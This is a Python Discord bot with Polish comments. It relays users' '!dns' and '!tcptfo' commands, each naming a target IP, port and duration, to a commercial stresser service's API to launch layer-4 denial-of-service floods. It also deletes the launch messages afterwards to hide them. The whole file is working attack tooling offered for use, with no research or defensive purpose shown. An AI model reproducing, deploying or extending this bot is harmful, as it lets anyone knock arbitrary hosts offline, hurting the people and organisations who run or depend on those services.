import os
import requests
import discord
import asyncio
from datetime import datetime

# --- BEZPIECZNE POBIERANIE KLUCZY ---
# Bot pobierze tokeny ze "schowka" na platformie Render
DISCORD_TOKEN = os.environ.get("DISCORD_TOKEN")
STRESSER_API_KEY = os.environ.get("STRESSER_API_KEY")

# --- USTAWIENIA ---
STRESSER_API_URL = "https://stresserbox.com/v2/api/"
ALLOWED_CHANNEL_NAME = "bot-ddos"

# --- KOD BOTA ---
intents = discord.Intents.default( )
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"BOT JEST ONLINE! Zalogowano jako {client.user}")
    # ... (reszta kodu bez zmian) ...
    bot_channel = None
    for guild in client.guilds:
        for channel in guild.text_channels:
            if channel.name == ALLOWED_CHANNEL_NAME:
                bot_channel = channel
                break
        if bot_channel:
            break
    if bot_channel:
        embed = discord.Embed(title="Bot Atakujący jest Online!", description="Jestem gotowy do przyjmowania poleceń.", color=discord.Color.green())
        embed.add_field(name="Format Komendy", value="`!metoda <ip> <port> <czas>`", inline=False)
        embed.add_field(name="Dostępne Metody", value="`!dns`\n`!tcptfo`", inline=True)
        embed.add_field(name="Dozwolone Porty", value="`53` lub `80`", inline=True)
        embed.add_field(name="Dozwolony Czas", value="od `15` do `60` sekund", inline=True)
        await bot_channel.send(embed=embed)

@client.event
async def on_message(message):
    # ... (reszta kodu bez zmian) ...
    if message.author == client.user or message.channel.name != ALLOWED_CHANNEL_NAME:
        return
    if message.content.lower().startswith('!dns') or message.content.lower().startswith('!tcptfo'):
        parts = message.content.split()
        if len(parts) != 4:
            await message.channel.send("Błędna komenda! Format: `!metoda <ip> <port> <czas>`")
            return
        method_cmd, target_ip, port_str, duration_str = parts[0].lower().replace('!', '').upper(), parts[1], parts[2], parts[3]
        if port_str not in ['53', '80']:
            await message.channel.send("Błędny port! Dozwolone: `53` lub `80`.")
            return
        try:
            duration = int(duration_str)
            if not (15 <= duration <= 60):
                await message.channel.send("Błędny czas! Dozwolony: `15` do `60` sekund.")
                return
        except ValueError:
            await message.channel.send("Błędny czas! Musi być liczbą.")
            return
        await message.channel.send(f"✅ Przyjęto! Atak **{method_cmd}** na **{target_ip}:{port_str}** na **{duration}**s...")
        payload = { "api_key": STRESSER_API_KEY, "action": "start", "layer": "layer4", "method": method_cmd, "target_url": target_ip, "port": int(port_str), "duration": duration, "concurrencies": 1 }
        try:
            response = requests.post(STRESSER_API_URL, json=payload, timeout=15)
            if "error" not in response.text.lower():
                success_msg = await message.channel.send(f"🚀 **SUKCES!** Atak `{method_cmd}` na `{target_ip}` uruchomiony!")
                await asyncio.sleep(60)
                await success_msg.delete()
                await message.delete()
            else:
                await message.channel.send(f"❌ **BŁĄD API!** Odpowiedź: `{response.text}`")
        except requests.exceptions.RequestException as e:
            await message.channel.send(f"🔥 **BŁĄD KRYTYCZNY!** Nie można połączyć z API. Błąd: `{e}`")

# --- URUCHOMIENIE ---
if __name__ == "__main__":
    if DISCORD_TOKEN and STRESSER_API_KEY:
        client.run(DISCORD_TOKEN)
    else:
        print("BŁĄD: Nie znaleziono tokenów w 'tajnym schowku' (Environment Variables)!")
        print("Upewnij się, że ustawiłeś DISCORD_TOKEN i STRESSER_API_KEY w ustawieniach na platformie Render.")
